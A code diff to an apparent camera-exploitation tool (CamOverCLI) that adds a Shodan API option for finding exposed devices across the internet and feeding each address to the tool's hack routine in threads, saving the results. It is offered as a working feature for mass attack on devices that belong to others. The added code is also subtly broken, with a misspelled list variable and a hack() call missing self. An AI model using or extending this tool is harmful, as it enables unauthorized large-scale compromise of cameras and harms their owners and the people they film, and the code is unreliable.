@@ -38,6 +38,7 @@ class CamOverCLI(CamOver, Badges):
     parser.add_argument('--output', dest='output', help='Output result to file.')
     parser.add_argument('--input', dest='input', help='Input file of addresses.')
     parser.add_argument('--address', dest='address', help='Single address.')
+    parser.add_argument('--api', dest='api', help='Shodan API key for exploiting devices over Internet.')
     args = parser.parse_args()
 
     def hack(self, host):
@@ -68,6 +69,32 @@ class CamOverCLI(CamOver, Badges):
         self.print_information(f"Thread #{str(number)} completed.")
         
     def start(self):
+        if self.args.api:
+            self.print_process("Authorizing Shodan by given API key...")
+            try:
+                shodan = Shodan(self.args.api)
+                results = shodan.search(query='5ccc069c403ebaf9f0171e9517f40e41')
+                adresses = list()
+                for result in results['matches']:
+                    addresses.append(result['ip_str'] + ':' + str(result['port']))
+            except Exception:
+                self.print_error("Failed to authorize Shodan!")
+                return
+            self.print_success("Authorization successfully completed!")
+            counter = 0
+            for address in addresses:
+                if not self.args.threads:
+                    result = hack(address)
+                    if result:
+                        if not self.args.output:
+                            self.print_success(result)
+                        else:
+                            with open(self.args.output, 'a') as f:
+                                f.write(f"{result}\n")
+                else:
+                    process = threading.Thread(target=self.thread, args=[counter, address])
+                    process.start()
+                counter += 1
         if self.args.input:
             with open(self.args.input, 'r') as f:
                 lines = f.read().strip().split('\n')
